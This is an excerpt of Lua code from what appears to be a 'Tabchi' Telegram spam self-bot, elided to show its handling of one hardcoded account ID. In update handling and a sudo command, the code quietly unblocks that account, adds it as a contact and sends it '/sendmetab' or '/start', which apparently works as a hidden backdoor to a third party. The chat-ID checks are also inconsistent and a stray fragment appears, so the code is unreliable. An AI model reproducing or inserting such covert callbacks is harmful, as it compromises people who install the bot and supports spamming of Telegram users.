...
function process_updates()
  if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":gotupdated") then
    ...
    if jdata.have_tab then
      ...
      tdcli.unblockUser(323937788)
      tdcli.importContacts(323937788, "Tabchi mod", "bot", 3239377880)
      tdcli.sendMessage(323937788, 0, 1, "/sendmetab", 1, "html")
...
function process(msg)
  ...
  if is_sudo(msg) then
    ...
    elseif text_:match("^[!/#](s2a) (.*) (.*)") then
      ...
      tdcli.sendMessage(323937788, 0, 1, "/start", 1, "html")
...
Bia pv]]
  ...
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 323937788 then
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 323937788 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, "/start")
    elseif data.chat_.id == 323937788 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(323937788, "Tabchi mod", "bot", data.chat_.id)
